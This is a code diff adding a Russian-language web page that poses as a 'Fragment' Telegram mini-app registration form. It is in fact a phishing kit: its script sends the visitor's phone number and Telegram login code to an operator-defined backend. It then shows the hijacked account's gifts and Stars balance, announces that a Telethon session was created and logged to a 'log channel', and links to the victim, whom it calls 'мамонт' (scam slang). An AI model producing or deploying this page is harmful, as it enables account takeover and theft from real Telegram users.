@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fragment - Регистрация через Telegram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            background: linear-gradient(135deg, #0a0e17 0%, #141b2d 100%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            margin-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .close-btn {
+            background: none;
+            border: none;
+            color: #a0a0b0;
+            font-size: 28px;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        .close-btn:hover { color: #ffffff; }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 24px;
+        }
+        .logo-icon { color: #2d8cff; font-size: 28px; }
+        .app-badge {
+            background: rgba(45, 140, 255, 0.1);
+            border: 1px solid rgba(45, 140, 255, 0.3);
+            border-radius: 20px;
+            padding: 4px 12px;
+            font-size: 12px;
+            color: #2d8cff;
+            font-weight: 500;
+        }
+        .card {
+            background: rgba(20, 25, 40, 0.8);
+            border-radius: 24px;
+            padding: 32px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            margin-bottom: 30px;
+        }
+        .card-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            background: linear-gradient(90deg, #2d8cff 0%, #6c5ce7 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .card-subtitle {
+            color: #a0a0b0;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+        .highlight { color: #ffffff; font-weight: 600; }
+        .form-group { margin-bottom: 24px; }
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #a0a0b0;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .phone-input, .code-input {
+            width: 100%;
+            padding: 18px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            color: #ffffff;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        .phone-input:focus, .code-input:focus {
+            outline: none;
+            border-color: #2d8cff;
+            background: rgba(45, 140, 255, 0.05);
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, #2d8cff 0%, #6c5ce7 100%);
+            border: none;
+            border-radius: 16px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+        }
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(45, 140, 255, 0.3);
+        }
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .code-screen { text-align: center; }
+        .code-instruction {
+            color: #a0a0b0;
+            margin-bottom: 32px;
+            font-size: 16px;
+        }
+        .code-display {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 40px;
+        }
+        .code-digit {
+            width: 60px;
+            height: 70px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 32px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+        .code-digit.active {
+            border-color: #2d8cff;
+            background: rgba(45, 140, 255, 0.1);
+            box-shadow: 0 0 20px rgba(45, 140, 255, 0.2);
+        }
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        .key {
+            height: 70px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            font-weight: 600;
+            color: #ffffff;
+            cursor: pointer;
+            transition: all 0.2s;
+            user-select: none;
+        }
+        .key:hover { background: rgba(255, 255, 255, 0.1); transform: translateY(-2px); }
+        .key:active { transform: translateY(0); }
+        .key-clear { color: #ff6b6b; }
+        .key-submit {
+            background: linear-gradient(90deg, #2d8cff 0%, #6c5ce7 100%);
+            color: white;
+            grid-column: span 2;
+        }
+        .loading-screen { text-align: center; }
+        .loading-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 16px;
+        }
+        .loading-text {
+            color: #a0a0b0;
+            margin-bottom: 40px;
+        }
+        .loading-spinner {
+            width: 80px;
+            height: 80px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top-color: #2d8cff;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 40px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .success-screen { text-align: center; }
+        .success-icon {
+            font-size: 80px;
+            color: #00d26a;
+            margin-bottom: 24px;
+        }
+        .success-details {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            padding: 24px;
+            margin: 32px 0;
+            text-align: left;
+        }
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 16px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .detail-item:last-child { margin-bottom: 0; padding-bottom: 0; border-bottom: none; }
+        .detail-label { color: #a0a0b0; }
+        .detail-value { font-weight: 600; }
+        .stars-value { color: #ffd700; }
+        .gifts-value { color: #ff6b9d; }
+        .profile-link {
+            display: inline-block;
+            padding: 16px 32px;
+            background: linear-gradient(90deg, #2d8cff 0%, #6c5ce7 100%);
+            border-radius: 16px;
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s;
+            margin-top: 16px;
+        }
+        .profile-link:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(45, 140, 255, 0.3);
+        }
+        .log-status {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            padding: 16px;
+            margin-top: 24px;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .log-icon { font-size: 18px; }
+        .log-success { color: #00d26a; }
+        .log-sending { color: #2d8cff; }
+        .log-error { color: #ff6b6b; }
+        @media (max-width: 480px) {
+            .card { padding: 24px; }
+            .code-digit { width: 50px; height: 60px; font-size: 28px; }
+            .key { height: 60px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <button class="close-btn" id="closeBtn">×</button>
+            <div class="logo"><i class="fas fa-cube logo-icon"></i><span>FRAGMENT</span></div>
+            <div class="app-badge">МИНИ-ПРИЛОЖЕНИЕ</div>
+        </div>
+
+        <div class="card" id="phoneScreen">
+            <h1 class="card-title">Регистрация</h1>
+            <p class="card-subtitle">
+                Введите номер телефона для регистрации на <span class="highlight">Fragment.</span> 
+                Номер должен быть такой же как на вашем аккаунте <span class="highlight">Telegram</span>
+            </p>
+            <div class="form-group">
+                <label class="form-label">Номер телефона</label>
+                <input type="tel" class="phone-input" id="phoneInput" placeholder="+79991234567" value="+79991234567">
+            </div>
+            <button class="submit-btn" id="sendPhoneBtn"><i class="fas fa-paper-plane"></i>ОТПРАВИТЬ</button>
+        </div>
+
+        <div class="card code-screen" id="codeScreen" style="display: none;">
+            <h1 class="card-title">Код подтверждения</h1>
+            <p class="code-instruction">Введите код, который пришел вам в Telegram</p>
+            <div class="code-display" id="codeDisplay">
+                <div class="code-digit" id="digit1"></div>
+                <div class="code-digit" id="digit2"></div>
+                <div class="code-digit" id="digit3"></div>
+                <div class="code-digit" id="digit4"></div>
+                <div class="code-digit" id="digit5"></div>
+            </div>
+            <div class="keypad">
+                <div class="key" data-key="1">1</div><div class="key" data-key="2">2</div><div class="key" data-key="3">3</div>
+                <div class="key" data-key="4">4</div><div class="key" data-key="5">5</div><div class="key" data-key="6">6</div>
+                <div class="key" data-key="7">7</div><div class="key" data-key="8">8</div><div class="key" data-key="9">9</div>
+                <div class="key key-clear" id="clearKey"><i class="fas fa-backspace"></i></div>
+                <div class="key" data-key="0">0</div>
+                <div class="key key-submit" id="submitCodeBtn">✓ Подтвердить</div>
+            </div>
+        </div>
+
+        <div class="card loading-screen" id="loadingScreen" style="display: none;">
+            <h1 class="loading-title">FRAGMENT</h1>
+            <p class="loading-text">Отправка номера...</p>
+            <div class="loading-spinner"></div>
+            <div class="log-status" id="loadingLogStatus">
+                <i class="fas fa-paper-plane log-icon log-sending"></i>
+                <span>Отправка номера в канал логов...</span>
+            </div>
+        </div>
+
+        <div class="card success-screen" id="successScreen" style="display: none;">
+            <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+            <h1 class="card-title">Регистрация успешна!</h1>
+            <p class="card-subtitle">Telethon сессия создана и данные отправлены в канал логов</p>
+            <div class="success-details">
+                <div class="detail-item"><span class="detail-label">👤 Профиль:</span><span class="detail-value" id="profileValue">@username</span></div>
+                <div class="detail-item"><span class="detail-label">🆔 ID сессии:</span><span class="detail-value" id="sessionId">123456789</span></div>
+                <div class="detail-item"><span class="detail-label">🎁 Подарков:</span><span class="detail-value gifts-value" id="giftsValue">12</span></div>
+                <div class="detail-item"><span class="detail-label">⭐️ Баланс звезд:</span><span class="detail-value stars-value" id="starsValue">1,850</span></div>
+            </div>
+            <a href="https://t.me/" target="_blank" class="profile-link" id="profileLink"><i class="fab fa-telegram"></i> Перейти к мамонту</a>
+            <div class="log-status log-success"><i class="fas fa-check-circle log-icon"></i><span>Данные успешно отправлены в канал логов</span></div>
+        </div>
+    </div>
+
+    <script>
+        // Конфигурация - укажите URL вашего бэкенда
+        const BACKEND_URL = 'https://ваш-сервер.com'; // Замените на ваш домен
+        
+        let currentCode = '';
+        let currentPhone = '';
+        let currentDigits = ['','','','',''];
+        let activeDigit = 0;
+        
+        // Закрытие
+        document.getElementById('closeBtn').addEventListener('click', () => {
+            if (confirm('Закрыть регистрацию?')) {
+                document.body.innerHTML = '<div class="container"><h1 style="text-align:center;padding:50px;">Регистрация отменена</h1></div>';
+            }
+        });
+        
+        // Отправка номера
+        document.getElementById('sendPhoneBtn').addEventListener('click', async () => {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone || !phone.startsWith('+')) {
+                alert('Введите номер телефона');
+                return;
+            }
+            
+            currentPhone = phone;
+            document.getElementById('phoneScreen').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'block';
+            
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/send-phone`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: phone})
+                });
+                
+                if (!response.ok) throw new Error('Ошибка отправки');
+                
+                const data = await response.json();
+                
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                    document.getElementById('codeScreen').style.display = 'block';
+                    
+                    // Устанавливаем код для демонстрации
+                    if (data.code) {
+                        currentCode = data.code;
+                        enterCodeManually(data.code);
+                    }
+                }, 1500);
+                
+            } catch (error) {
+                alert('Ошибка: ' + error.message);
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('phoneScreen').style.display = 'block';
+            }
+        });
+        
+        // Клавиатура
+        document.querySelectorAll('.key[data-key]').forEach(key => {
+            key.addEventListener('click', () => {
+                const digit = key.getAttribute('data-key');
+                if (activeDigit < 5) {
+                    currentDigits[activeDigit] = digit;
+                    document.getElementById(`digit${activeDigit+1}`).textContent = digit;
+                    document.getElementById(`digit${activeDigit+1}`).classList.add('active');
+                    
+                    if (activeDigit < 4) {
+                        activeDigit++;
+                        document.getElementById(`digit${activeDigit+1}`).classList.add('active');
+                    }
+                }
+            });
+        });
+        
+        document.getElementById('clearKey').addEventListener('click', () => {
+            for (let i = 0; i < 5; i++) {
+                currentDigits[i] = '';
+                document.getElementById(`digit${i+1}`).textContent = '';
+                document.getElementById(`digit${i+1}`).classList.remove('active');
+            }
+            activeDigit = 0;
+            document.getElementById('digit1').classList.add('active');
+        });
+        
+        // Подтверждение кода
+        document.getElementById('submitCodeBtn').addEventListener('click', async () => {
+            const code = currentDigits.join('');
+            if (code.length !== 5) {
+                alert('Введите все 5 цифр кода');
+                return;
+            }
+            
+            document.getElementById('codeScreen').style.display = 'none';
+            document.getElementById('loadingScreen').style.display = 'block';
+            document.getElementById('loadingLogStatus').innerHTML = 
+                '<i class="fas fa-spinner fa-spin log-icon log-sending"></i><span>Создание Telethon сессии...</span>';
+            
+            try {
+                const response = await fetch(`${BACKEND_URL}/api/verify-code`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: currentPhone, code: code})
+                });
+                
+                if (!response.ok) throw new Error('Ошибка верификации');
+                
+                const data = await response.json();
+                
+                if (data.error) {
+                    throw new Error(data.error);
+                }
+                
+                // Успешная регистрация
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                    document.getElementById('successScreen').style.display = 'block';
+                    
+                    // Заполняем данные
+                    if (data.username) {
+                        document.getElementById('profileValue').textContent = '@' + data.username;
+                        document.getElementById('profileLink').href = `https://t.me/${data.username}`;
+                    }
+                    if (data.user_id) document.getElementById('sessionId').textContent = data.user_id;
+                    if (data.gifts !== undefined) document.getElementById('giftsValue').textContent = data.gifts;
+                    if (data.stars !== undefined) document.getElementById('starsValue').textContent = data.stars.toLocaleString();
+                    
+                }, 2000);
+                
+            } catch (error) {
+                alert('Ошибка: ' + error.message);
+                document.getElementById('loadingScreen').style.display = 'none';
+                document.getElementById('codeScreen').style.display = 'block';
+            }
+        });
+        
+        // Вспомогательная функция для ввода кода
+        function enterCodeManually(code) {
+            currentDigits = code.split('');
+            for (let i = 0; i < 5; i++) {
+                if (i < code.length) {
+                    document.getElementById(`digit${i+1}`).textContent = code[i];
+                    document.getElementById(`digit${i+1}`).classList.add('active');
+                }
+            }
+            activeDigit = 5;
+        }
+        
+        // Инициализация
+        document.getElementById('digit1').classList.add('active');
+    </script>
+</body>
+</html>
